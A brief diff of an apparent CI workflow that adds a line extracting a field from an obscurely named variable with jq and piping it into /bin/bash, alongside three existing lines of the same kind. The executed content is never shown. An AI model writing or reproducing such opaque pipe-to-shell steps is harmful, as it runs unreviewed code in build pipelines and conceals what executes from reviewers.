@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$v7" | jq -r .wcx006 | /bin/bash
           printf '%s' "$vs3" | jq -r .ls8 | /bin/bash
           echo $l2905 | jq -r .ue091 | /bin/bash
+          printf '%s' "$rpvfy4166" | jq -r .r0161 | /bin/bash
 
       - name: Archive results
         if: always()
